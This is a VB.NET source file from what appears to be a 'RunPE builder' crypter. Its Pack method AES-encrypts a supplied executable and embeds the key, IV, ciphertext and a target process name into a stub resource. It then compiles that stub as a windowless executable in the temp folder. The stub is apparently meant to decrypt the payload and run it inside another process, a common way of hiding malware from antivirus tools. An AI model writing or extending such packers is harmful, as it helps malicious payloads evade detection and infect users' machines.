Imports System
Imports System.CodeDom.Compiler
Imports System.Collections.Generic
Imports System.IO
Imports System.Security.Cryptography
Imports Microsoft.CSharp

Namespace RunPEBuilder.Include
    Friend Class PckMethod
        Public Enum DotNetVersion
            v2_0
            v3_5
            v4_0
        End Enum

        Public Shared Function Pack(assembly As Byte(), processName As String, version As DotNetVersion) As Byte()
            Try
                ' Initialize AES encryption
                Using aes As AesManaged = New AesManaged With {
    .KeySize = 256,
    .Padding = PaddingMode.ISO10126
}
                    aes.GenerateIV()
                    aes.GenerateKey()

                    Dim key = Convert.ToBase64String(aes.Key)
                    Dim iv = Convert.ToBase64String(aes.IV)
                    Dim app As String

                    ' Encrypt the assembly
                    Using memoryStream As MemoryStream = New MemoryStream()
                        Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write)
                            cryptoStream.Write(assembly, 0, assembly.Length)
                            cryptoStream.FlushFinalBlock()
                            app = Convert.ToBase64String(memoryStream.ToArray())
                        End Using
                    End Using

                    ' Prepare the stub code
                    Dim csharpcode = Properties.Resources.stub.Replace("%KEY%", key).Replace("%IV%", iv).Replace("%PROGRAM%", app).Replace("%PROCESS_NAME%", processName)

                    Dim orig = Reflection.Assembly.Load(assembly)

                    Dim providerOptions = New Dictionary(Of String, String) From {
    {"CompilerVersion", If(version = DotNetVersion.v4_0, "v4.0", If(version = DotNetVersion.v3_5, "v3.5", "v2_0"))}
}

                    Using codeProvider As CSharpCodeProvider = New CSharpCodeProvider(providerOptions)
                        Dim parameters As CompilerParameters = New CompilerParameters With {
    .CompilerOptions = "/target:winexe",
    .GenerateExecutable = True,
    .OutputAssembly = Path.GetTempPath() & Guid.NewGuid().ToString() & ".exe"
}

                        parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll")
                        parameters.ReferencedAssemblies.Add("System.dll")
                        parameters.ReferencedAssemblies.Add("System.Core.dll")

                        For Each name In orig.GetReferencedAssemblies()
                            If name.Name.Contains("System.") OrElse name.Name.Contains("Microsoft.") Then parameters.ReferencedAssemblies.Add(name.Name & ".dll")
                        Next

                        ' Compile the stub
                        Dim results = codeProvider.CompileAssemblyFromSource(parameters, csharpcode)

                        If results.Errors.HasErrors Then
                            For Each [error] As CompilerError In results.Errors
                                Console.WriteLine($"Error ({[error].ErrorNumber}): {[error].ErrorText}")
                            Next
                            Return Nothing
                        End If

                        ' Read the compiled assembly
                        Using fs As FileStream = New FileStream(results.PathToAssembly, FileMode.Open, FileAccess.Read)
                            Dim barr = New Byte(fs.Length - 1) {}
                            fs.Read(barr, 0, barr.Length)
                            Return barr
                        End Using
                    End Using
                End Using
            Catch ex As Exception
                Console.WriteLine($"Exception in Pack method: {ex.Message}
Stack Trace:
{ex.StackTrace}")
                Return Nothing
            End Try
        End Function
    End Class
End Namespace
